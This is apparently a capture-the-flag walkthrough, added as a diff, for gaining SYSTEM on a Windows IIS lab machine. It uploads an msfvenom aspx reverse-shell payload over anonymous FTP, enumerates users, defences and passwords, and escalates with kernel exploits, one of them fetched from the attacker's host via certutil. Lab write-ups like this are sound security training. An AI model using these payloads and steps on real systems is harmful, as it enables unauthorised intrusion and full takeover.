@@ -1,0 +1,210 @@
+We start with a nmap scan: sudo nmap -sC -sV (target ip)
+
+We find that there are two ports open: 21/tcp which is a ftp server (anonymous), and 80/tcp which is http.
+
+by logging into the ftp server: ftp (target ip), username: anonymous, password:"". We can list the files which are inside this server. We see files welcome.png, and issstart.htm for example.
+
+If we try to search the target ip in the url, we will see a welcome page for the internet information services, which is a web server for windows. 
+
+If we inspect the picture in the welcome page, we can see that it is named welcome.png. We can conclude that the server that we are now signe in anonymously is a web server.
+
+We can further confirm that if we made a file on our local machine and upload it to the ftp server.
+
+First we do: echo "This is a test">test.txt
+
+In the ftp server we do: put test.txt
+
+If we searched (target ip)/test.txt, we will find our text written.
+
+Using Wappalyzer, we know that the website runs on asp.net. 
+
+We google asp payload cheatsheet.
+
+We got this for a reverse shell : msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
+
+-p windows/meterpreter/reverse_tcp specifies the payload to use. In this case, it's a reverse TCP Meterpreter shell for Windows.
+ and where LHOST is our ip address, and -f is for the file type . We are using a file type of aspx.
+
+In our local machine we do : sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=( our IP Address) LPORT=(Your Port) -f apsx > exploit.aspx. let the port be 4444
+
+After doing that, we run metasploit: msfconsole
+
+We do : use exploit/multi/handler
+
+Now,we do: set payload windows/meterpreter/reverse_tcp
+
+then, we do : set lhost tun0. Finally, we do: run
+
+Now, on the ftp server, we upload our exploit file by: put exploit.aspx
+
+We go to our url search and put : (target ip)/exploit.aspx
+
+If we go back to our metasploit cmd window, we find that we have gained access to the windows machine, and if we did: getuid, we will get back a server username: IIS APPPOOL\Web.
+
+Now we need to escalate our privilages to the root or administrator.
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+We can go to the shell of the machine by typing machine.
+
+We can get all of the info that we need in our exploitation of the machine by typing systeminfo.
+
+We can see the privilages of our current user by: whoami /priv. We can also see the groups that the current user is in by: whoami /groups
+
+We can also list the users by: net user. We see that we have three users: Administrator, babis and Guest.
+
+We can see info about individual users by: net user (user name)
+
+We notice that when we get info about babis and administrator that babis is in the Users group while administrator is in the administrators group. This means we dont need to take over babis because this will achive nothing. We only should try to take over administrator.
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Networking Enumeration:
+
+We can get info about the machine ip address by: ipconfig. We even can get more info by: ipconfig /all.
+
+We can see the current ARP (Address Resolution Protocol) by: arp -a
+
+We can display active network connections, listening ports, and associated process IDs (PIDs) by: netstat -ano
+
+The Local Address column shows the IP address and port number of the local system, while the Foreign Address column displays the IP address and port number of the remote system. The State column indicates the state of the connection (e.g., LISTENING, ESTABLISHED, etc.), and the PID column represents the process ID of the associated process.
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Password Hunting:
+
+We can search for files that holds passwords.
+
+We can search for such files by: findstr /si password *.txt
+
+The command will search for the string "password" in all .txt files within the specified directory and its subdirectories. The /s option tells findstr to search in subdirectories, and the /i option makes the search case-insensitive.
+
+Since this command only search for the current directory and its sub directories, we can go back a directory so our command can search more files.
+
+We found some files but nothing is useful.
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Anti Viruses and Firewalls Enumerations:
+
+We can show the status of the Windows Defender by: sc query windefend.
+
+sc is the command used to communicate with the Service Control Manager (SCM) in Windows. It allows you to manage services, including querying their status and configuration.
+
+query is a subcommand of the sc command that is used to retrieve information about a specific service.
+
+windefend is the argument or parameter provided to the query subcommand. In this case, it specifies the name of the service for which we want to retrieve information. "windefend" refers to the Windows Defender service, which is the built-in antivirus and antimalware solution in Windows.
+
+We can see the services running on this machine by: sc queryex type= service.
+
+Note, a space must be added between type= and service.
+
+We can see the firewalls by: netsh firewall show state.
+
+netsh is the command-line tool used to interact with various network settings in Windows.
+
+firewall is a context within netsh that allows you to configure and manage the Windows Firewall settings.
+
+show is a subcommand of the firewall context that is used to display specific information or states of the Windows Firewall.
+
+state is an argument or parameter provided to the show subcommand. In this case, it instructs netsh to display the current state of the Windows Firewall.
+
+We can also show the configurations by: netsh firewall show config.
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Automation Tools:
+
+For metasploit to give us suggestions about how we can exploit the machine that we are on, we need to be on meterpreter and do: run post/multi/recon/local_exploit_suggester.
+
+We copy the exploits that are vulnerable and we save it in a seperate text file.
+
+We also get the system info. We enter the shell and we do: systeminfo. We copy the result and we save it in a seperate text file.
+
+We also need to download the windows exploit suggester from this github: https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py
+
+We extract the windows-exploit-suggester python file and we put it in root.
+
+Following the instructions on the github repository for this tool. First we need to update the database. We do: python3 ./windows-exploit-suggester.py --update.
+
+Note: This tool doesnt work with python3.
+
+Next, we do: pip install xlrd --upgrade.
+
+We need to know what database file was updated. We find this after we run the update command with this tool. The database file in our case is: 2023-07-03-mssb.xls
+
+We also need to put the sysinfo text file that we created in root. Then we do: python3 ./windows-exploit-suggester.py --database 2023-07-03-mssb.xls --systeminfo SysInfo.txt.
+
+We get existing vulnerabilities with their codes.
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Kernel Exploits:
+
+We copy one of the vulnarabilities that we got. For example, exploit/windows/local/ms10_015_kitrap0d.
+
+On meterpreter, we do: background. This will return the number of our session. take note of this number.
+
+Then, we do: use exploit/windows/local/ms10_015_kitrap0d.
+
+we set the session to our session number: set session (session number).
+
+We set our port to 5555: set lport 5555.
+
+We run.
+
+We find that we are in a new session and if we do: getuid, we see that the username is: NT AUTHORITY\SYSTEM
+
+We now can get the two flags from Administrator/Desktop and babis/Desktop from C:/Users.
+
+admin flag:49e5793743d6f25c4efd4aef70da13a5
+
+babis flag:b238ed00a7a9affd9fe2182d817cb4c8
+
+//END
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+//Manual Exploit:
+
+Now we dont use metasploit and we try to exploit the machine manually.
+
+We do: msfvenom -p windows/shell_reverse_tcp LHOST=(our ip address) LPORT=4444 -f aspx > manual.aspx
+
+We login using ftp and upload aspx file that we created.
+
+We use netcat to listen on port 4444: nc -nvlp 4444.
+
+As we did before, we go to our search engine and search for (target ip)/manual.aspx.
+
+Now, if we returned back to our cmd window that is running netcat, we can find that we now have access to the machine.
+
+From the list of exploits that we got from the previous part, we need to use the exploit MS10-059 which we can get it from this Github: https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe
+
+We download into our downloads, and in our downloads we do: python2 -m SimpleHTTPServer 80
+
+In the windows machine, we go to C:\Windows\Temp and we do: certutil -urlcache -f http://(our ip address)/MS10-059.exe ms.exe . This will download the file from what ever ip address we give to it, which in this case is our ip address. the ms.exe at the end is going to be the name of the file which is going to be downloaded into the machine.
+
+After that, in our local machine and in a new cmd windowe, we do: nc -nvlp 5555.
+
+We go back to the windows machine and we do : ms.exe (our ip address) 5555
+
+Now, if we came back to the window that was running netcat on port 5555, we will see that we now have access to the windows machine. To see which user we are using, we do: whoami, and indeed we are admin.
+
+//END
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
